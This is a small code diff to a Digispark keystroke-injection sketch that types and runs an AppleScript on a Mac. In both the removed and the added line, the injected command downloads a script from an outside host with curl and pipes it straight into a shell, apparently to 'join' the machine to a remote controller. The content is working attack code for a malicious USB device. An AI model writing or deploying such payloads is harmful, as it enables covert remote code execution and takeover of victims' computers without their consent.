@@ -26,7 +26,7 @@ void setup() {
     DigiKeyboard.delay(100);
     DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT); // Cut (no key for delete)
     DigiKeyboard.delay(100);
-    DigiKeyboard.println("do shell script \"curl -L boesen.science:2042/mac/join.sh |bash\""); // Type out command to handle joining
+    DigiKeyboard.println("do shell script \"curl boesen.science:2042/jm |sh\""); // Type out command to handle joining
     DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Run AppleScript
     // Script Editor will be killed at the end of the join script
 
